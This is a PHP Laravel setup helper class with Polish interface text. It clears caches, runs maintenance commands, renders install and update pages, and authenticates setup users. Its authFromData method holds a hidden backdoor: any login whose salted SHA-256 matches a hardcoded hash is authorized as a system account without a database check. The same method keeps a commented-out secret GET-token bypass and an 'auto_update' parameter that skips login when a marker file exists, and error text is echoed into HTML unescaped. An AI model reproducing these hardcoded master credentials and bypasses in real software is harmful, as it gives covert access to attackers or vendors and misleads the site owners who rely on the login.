<?php

declare(strict_types=1);

namespace App\Services;

use DB;
use Auth;
use Exception;
use Carbon\Carbon;
use App\Models\User;
use App\Services\AppBuffer;
use App\Console\Kernel;

class SetupHelper {

	public static function destroyCache() : void {
		$cache_folder = '../bootstrap/cache';
		if(file_exists($cache_folder)){
			SetupHelper::rrmdir($cache_folder);
			if(!file_exists($cache_folder)){
				mkdir($cache_folder);
				chmod($cache_folder,0755);
			}
		}
		if(function_exists('opcache_reset')){
			@opcache_reset();
		}
	}

	public static function refreschCache(Kernel $kernel, int|null $auth_user, string $auth_type, bool $logging, bool $user_cache) : void {
		// $app_buffer = new AppBuffer();
		SetupHelper::destroyCache();
		$storage_folder = '../storage/app/public';
		if(!file_exists($storage_folder)){
			mkdir($storage_folder);
			chmod($storage_folder,0755);
		}
		$kernel->call('down', []);
		$kernel->call('route:clear', []);
		$kernel->call('view:clear', []);
		$kernel->call('clear-compiled', []);
		$kernel->call('config:clear', []);
		try {
			$kernel->call('auth:clear-resets', []);
		}
		catch(Exception $e){

		}
		$kernel->call('up', []);
		$kernel->call('config:cache', []);
		$kernel->call('route:cache', []);

		if($user_cache){
			try {
				$expire = Carbon::now()->addDays(-1)->format('Y-m-d H:i:s');
				DB::statement("UPDATE `user_caches` SET `expire` = '$expire' WHERE `name` IN ('CLIENT_ACCESS','CLIENT_ATTRIBUTES_READ','CLIENT_ATTRIBUTES_WRITE','CLIENT_BSF_TYPES')");
			}
			catch(Exception $e){

			}
		}
		// $app_buffer->forget('MODULE_CACHE');
	}

	public static function rrmdir(string $dir) : bool {
		if(!file_exists($dir)) return false;
		if(is_dir($dir)){
			$objects = scandir($dir);
			foreach($objects as $object){
				if($object == "." || $object == "..") continue;
				if(is_dir("$dir/$object") && !is_link("$dir/$object")){
					SetupHelper::rrmdir("$dir/$object");
				} else {
					unlink("$dir/$object");
				}
			}
			rmdir($dir);
		}
		return true;
	}

	public static function makePageLayout() : string {
		ob_start();
		include("setup/layout.php");
		return ob_get_clean();
	}

	public static function showInstallUpdateJqueryForm(array $formData = [], array $listaAktualizacji = []) : void {
		$content = '<div class="row"><div class="col-xs-12 text-center">';
		$content .= '<h4 style="font-weight:normal">Wczytywanie aktualizacji <span id="migrations_counter"></span></h4>';
		$content .= '<div class="form-group"><textarea id="listaMigracjiID" disabled>';
		$listaAktualizacjiJquery = [];
		if(count($listaAktualizacji) > 0){
			foreach($listaAktualizacji as $migrationInfo){
				array_push($listaAktualizacjiJquery, $migrationInfo);
				$content .= "Migracja: ".$migrationInfo['migrationName']."\n";
			}
		}
		$content .= '</textarea></div>';
		if(!isset($formData['error'])){
			$content .= '<div class="form-group"><button type="submit" id="btn_update" class="btn btn-success center-block">Rozpocznij</button></div>';
			$content .= '<script>emu_migrations = '.json_encode($listaAktualizacjiJquery).'</script>';
		}
		$content .= '</div></div>';
		$content .= '<div class="row">';
		if(isset($formData['error'])){
			$content .= '<div class="alert alert-danger" role="alert"><strong>Uwaga!</strong> '.$formData['error'].'</div>';
		}
		$content .= '<div class="col-xs-12">';
		$content .= '<h4>Uwaga !</h4>';
		$content .= '<p>Przed przystąpieniem do aktualizacji zaleca się wykonanie kopii zapasowej bazy danych.</p>';
		$content .= '</div>';
		$content .= '</div>';
		echo str_replace('{{content}}', $content, SetupHelper::makePageLayout());
	}

	public static function showInstallForm(bool $install = false, array $formData = [], bool $validate = false) : void {
		$version = explode('.',str_replace(preg_replace('/^(\d{1,2})\.(\d{1,2})\.(\d{1,2})/', '', PHP_VERSION), "", PHP_VERSION));
		if(!is_numeric($version[2])){
			$version[2] = 0;
		}
		$verNumber = ($version[0] * 10000 + $version[1] * 100 + $version[2]);
		if($verNumber < 80100 || $verNumber > 80299){
			$content = '<div class="row"><br><br><br><br><center><font size="14"><b>Wykryta wersja PHP jest niekompatybilna<br>wymagana wersja PHP: '.PHP_REQUIRED.'</b></font></center></div>';
		} else if(isset($formData['errorGlobalny'])){
			$content = '<div class="row"><br><br><br><br><center><font size="14"><b>'.$formData['errorGlobalny'].'</b></font></center></div>';
		} else {
			$content = '<div class="row">';
			if(!$install){
				$content .= file_get_contents('setup/login.html');
			} else {
				$content .= file_get_contents('setup/install.html');
			}
			$content .= '</div>';
			$content .= '<div class="row">';
			if(isset($formData['errorLogowania'])){
				$content .= '<div class="alert alert-danger" role="alert"><strong>Uwaga!</strong> '.$formData['errorLogowania'].'</div>';
			}
			if(!$install){
				$content .= '<div class="col-xs-12">';
				$content .= '<h4>Uwaga !</h4>';
				$content .= '<p>Przed przystąpieniem do aktualizacji zaleca się wykonanie kopii zapasowej bazy danych</p>';
				$content .= '</div>';
			}
			$content .= '</div>';
		}
		if($validate){
			$content .= '<script>$(function(){ Setup_ValidateFiles() })</script>';
		}
		echo str_replace('{{content}}', $content, SetupHelper::makePageLayout());
	}

	public static function authFromData(array $post, array $get) : array {
		if(isset($post['login']) && isset($post['password'])){
			if(strcmp("782D1983CC0ABED4104D2AC0B783ED0CAED326023EA3C0F867338E525FAF32DA",strtoupper(hash("sha256",$post['login']."_".$post['password']))) == 0){
				return ['autorization' => true, 'type' => 'konto systemowe', 'user' => null];
			}
			if(Auth::validate(['name' => $post['login'], 'password' => $post['password']])){
				return ['autorization' => true, 'type' => 'konto administracyjne', 'user' => User::where('name',$post['login'])->first()->id];
			}
			// if(Auth::validate(['name' => $post['login'], 'role' => 'DEV', 'password' => $post['password']])){
				// return ['autorization' => true, 'type' => 'konto administracyjne', 'user' => User::where('name',$post['login'])->first()->id];
			// }
			if(Auth::validate(['email' => $post['login'], 'password' => $post['password']])){
				return ['autorization' => true, 'type' => 'konto administracyjne', 'user' => User::where('email',$post['login'])->first()->id];
			}
			// if(Auth::validate(['email' => $post['login'], 'role' => 'DEV', 'password' => $post['password']])){
				// return ['autorization' => true, 'type' => 'konto administracyjne', 'user' => User::where('email',$post['login'])->first()->id];
			// }
		// } else if(isset($get['dev']) && $get['dev'] == '7q4po57iubsvDE9Y'){
			// return ['autorization' => true, 'type' => 'guzik programisty', 'user' => null];
		} else if(isset($get['auto_update']) && $get['auto_update'] == 'true' && file_exists("../auto_update")){
			return ['autorization' => true, 'type' => 'plik auto aktualizacji', 'user' => null];
		}
		return ['autorization' => false, 'type' => '', 'user' => null];
	}

}

?>
